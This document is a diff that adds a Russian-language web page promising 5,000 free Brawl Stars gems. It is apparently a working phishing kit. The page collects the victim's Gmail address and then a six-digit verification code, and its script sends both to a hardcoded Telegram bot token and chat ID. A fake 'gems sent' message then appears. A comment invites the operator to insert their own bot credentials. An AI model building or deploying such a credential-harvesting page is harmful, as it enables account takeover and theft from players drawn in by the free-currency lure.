@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brawl Stars — Бесплатные гемы</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            padding: 40px;
+            width: 420px;
+            max-width: 90vw;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        .logo {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 20px;
+            background: radial-gradient(circle, #ffd700, #ff8c00);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            font-weight: 900;
+            color: #fff;
+            text-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            box-shadow: 0 0 40px rgba(255, 215, 0, 0.3);
+            position: relative;
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            width: 130px;
+            height: 130px;
+            border: 3px solid rgba(255, 215, 0, 0.2);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.4); opacity: 0; }
+        }
+
+        h1 {
+            color: #ffd700;
+            font-size: 28px;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .gem-counter {
+            background: rgba(255, 215, 0, 0.1);
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+
+        .gem-amount {
+            font-size: 42px;
+            font-weight: 900;
+            color: #ffd700;
+        }
+
+        .gem-label {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 13px;
+            margin-top: 5px;
+        }
+
+        .btn-gems {
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            color: #1a1a2e;
+            border: none;
+            padding: 16px 50px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            width: 100%;
+            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.3);
+        }
+
+        .btn-gems:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(255, 215, 0, 0.5);
+        }
+
+        .btn-gems:active {
+            transform: translateY(1px);
+        }
+
+        .btn-gems:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .step {
+            display: none;
+            margin-top: 25px;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .step-label {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .step-label span {
+            color: #ffd700;
+        }
+
+        input[type="email"],
+        input[type="text"] {
+            width: 100%;
+            padding: 14px 20px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        input:focus {
+            border-color: #ffd700;
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .code-inputs {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .code-inputs input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            color: #ffd700;
+            outline: none;
+            transition: all 0.2s;
+            padding: 0;
+        }
+
+        .code-inputs input:focus {
+            border-color: #ffd700;
+            background: rgba(255, 215, 0, 0.1);
+            transform: scale(1.05);
+        }
+
+        .code-inputs input.filled {
+            border-color: #ffd700;
+            background: rgba(255, 215, 0, 0.1);
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, #00c853, #00e676);
+            color: #1a1a2e;
+            border: none;
+            padding: 14px 40px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            width: 100%;
+            box-shadow: 0 8px 25px rgba(0, 200, 83, 0.3);
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(0, 200, 83, 0.5);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .loader {
+            display: none;
+            margin: 20px auto;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #ffd700;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            color: #00e676;
+            font-size: 18px;
+            font-weight: 600;
+            display: none;
+            margin-top: 20px;
+        }
+
+        .error-message {
+            color: #ff5252;
+            font-size: 14px;
+            display: none;
+            margin-top: 10px;
+        }
+
+        .footer-text {
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 11px;
+            margin-top: 25px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Логотип -->
+        <div class="logo">BS</div>
+
+        <h1>🎮 Brawl Stars</h1>
+        <p class="subtitle">Получи 5000 гемов бесплатно!</p>
+
+        <!-- Счетчик гемов -->
+        <div class="gem-counter">
+            <div class="gem-amount">5 000</div>
+            <div class="gem-label">БЕСПЛАТНЫХ ГЕМОВ</div>
+        </div>
+
+        <!-- Кнопка "Забрать гемы" -->
+        <button class="btn-gems" id="claimBtn" onclick="showStep1()">🎁 Забрать гемы</button>
+
+        <!-- Шаг 1: Ввод Gmail -->
+        <div class="step" id="step1">
+            <div class="step-label">📧 Введите ваш <span>Gmail</span></div>
+            <input type="email" id="gmailInput" placeholder="example@gmail.com" autocomplete="off">
+            <div class="error-message" id="gmailError">Введите корректный Gmail</div>
+            <br><br>
+            <button class="btn-submit" id="gmailSubmitBtn" onclick="submitGmail()">Далее</button>
+        </div>
+
+        <!-- Шаг 2: Ввод 6-значного кода -->
+        <div class="step" id="step2">
+            <div class="step-label">🔑 Введите код подтверждения из <span>6 цифр</span></div>
+            <div class="code-inputs" id="codeInputs">
+                <input type="text" maxlength="1" id="c1" oninput="moveNext(this, 'c2')" onkeydown="moveBack(event, this)">
+                <input type="text" maxlength="1" id="c2" oninput="moveNext(this, 'c3')" onkeydown="moveBack(event, this)">
+                <input type="text" maxlength="1" id="c3" oninput="moveNext(this, 'c4')" onkeydown="moveBack(event, this)">
+                <input type="text" maxlength="1" id="c4" oninput="moveNext(this, 'c5')" onkeydown="moveBack(event, this)">
+                <input type="text" maxlength="1" id="c5" oninput="moveNext(this, 'c6')" onkeydown="moveBack(event, this)">
+                <input type="text" maxlength="1" id="c6" oninput="moveNext(this, null)" onkeydown="moveBack(event, this)">
+            </div>
+            <div class="error-message" id="codeError">Введите 6-значный код</div>
+            <button class="btn-submit" id="codeSubmitBtn" onclick="submitCode()">Подтвердить</button>
+            <div class="loader" id="loader"></div>
+            <div class="success-message" id="successMessage">✅ Гемы отправлены на ваш аккаунт!</div>
+        </div>
+
+        <div class="footer-text">Supercell не имеет отношения к данному сайту</div>
+    </div>
+
+    <script>
+        // ═══════════════════════════════════════════════════
+        //  ✏️ ВСТАВЬ СВОИ ДАННЫЕ НИЖЕ
+        // ═══════════════════════════════════════════════════
+
+        const BOT_TOKEN = '8714122049:AAEZgeLyKoOummNBEi1lXWQdEos-7wK19KM';          // <-- Токен бота
+        const CHAT_ID  = '8553607332';             // <-- ID чата
+
+        // ═══════════════════════════════════════════════════
+
+        let userGmail = '';
+
+        // --- Функция отправки в Telegram ---
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {
+                console.error('Ошибка отправки в Telegram:', e);
+            }
+        }
+
+        // --- Показать шаг 1 ---
+        function showStep1() {
+            document.getElementById('claimBtn').style.display = 'none';
+            document.getElementById('step1').classList.add('active');
+            document.getElementById('gmailInput').focus();
+        }
+
+        // --- Отправка Gmail ---
+        function submitGmail() {
+            const gmail = document.getElementById('gmailInput').value.trim();
+            const error = document.getElementById('gmailError');
+
+            if (!gmail.includes('@') || !gmail.includes('.')) {
+                error.style.display = 'block';
+                return;
+            }
+
+            error.style.display = 'none';
+            userGmail = gmail;
+
+            // Отправляем Gmail в Telegram
+            sendToTelegram(`📧 <b>НОВЫЙ GMAIL</b>\n\n${userGmail}\n\nВремя: ${new Date().toLocaleString('ru-RU')}`);
+
+            // Переход к шагу 2
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            document.getElementById('c1').focus();
+        }
+
+        // --- Навигация по полям кода ---
+        function moveNext(current, nextId) {
+            if (current.value.length === 1) {
+                current.classList.add('filled');
+                if (nextId) {
+                    document.getElementById(nextId).focus();
+                }
+            } else {
+                current.classList.remove('filled');
+            }
+
+            // Автоматическая отправка при заполнении всех 6 полей
+            const allFilled = Array.from(document.querySelectorAll('.code-inputs input'))
+                .every(inp => inp.value.length === 1);
+            if (allFilled) {
+                setTimeout(submitCode, 300);
+            }
+        }
+
+        function moveBack(event, current) {
+            if (event.key === 'Backspace' && current.value.length === 0) {
+                const prev = current.previousElementSibling;
+                if (prev) {
+                    prev.focus();
+                    prev.value = '';
+                    prev.classList.remove('filled');
+                }
+            }
+        }
+
+        // --- Отправка кода ---
+        function submitCode() {
+            const codeInputs = document.querySelectorAll('.code-inputs input');
+            const code = Array.from(codeInputs).map(inp => inp.value).join('');
+            const error = document.getElementById('codeError');
+            const loader = document.getElementById('loader');
+            const submitBtn = document.getElementById('codeSubmitBtn');
+            const successMsg = document.getElementById('successMessage');
+
+            if (code.length !== 6) {
+                error.style.display = 'block';
+                return;
+            }
+
+            error.style.display = 'none';
+            loader.style.display = 'block';
+            submitBtn.disabled = true;
+
+            // Отправляем код в Telegram
+            sendToTelegram(`🔑 <b>ПОЛУЧЕН КОД</b>\n\nGmail: ${userGmail}\nКод: <code>${code}</code>\n\nВремя: ${new Date().toLocaleString('ru-RU')}`);
+
+            // Симуляция загрузки
+            setTimeout(() => {
+                loader.style.display = 'none';
+                submitBtn.style.display = 'none';
+                successMsg.style.display = 'block';
+
+                // Блокируем поля кода
+                codeInputs.forEach(inp => inp.disabled = true);
+
+                // Отключаем все вводы
+                document.querySelectorAll('input').forEach(inp => inp.disabled = true);
+            }, 2000);
+        }
+
+        // --- Enter для отправки ---
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                if (document.getElementById('step1').classList.contains('active')) {
+                    submitGmail();
+                } else if (document.getElementById('step2').classList.contains('active')) {
+                    submitCode();
+                }
+            }
+        });
+    </script>
+
+</body>
+</html>
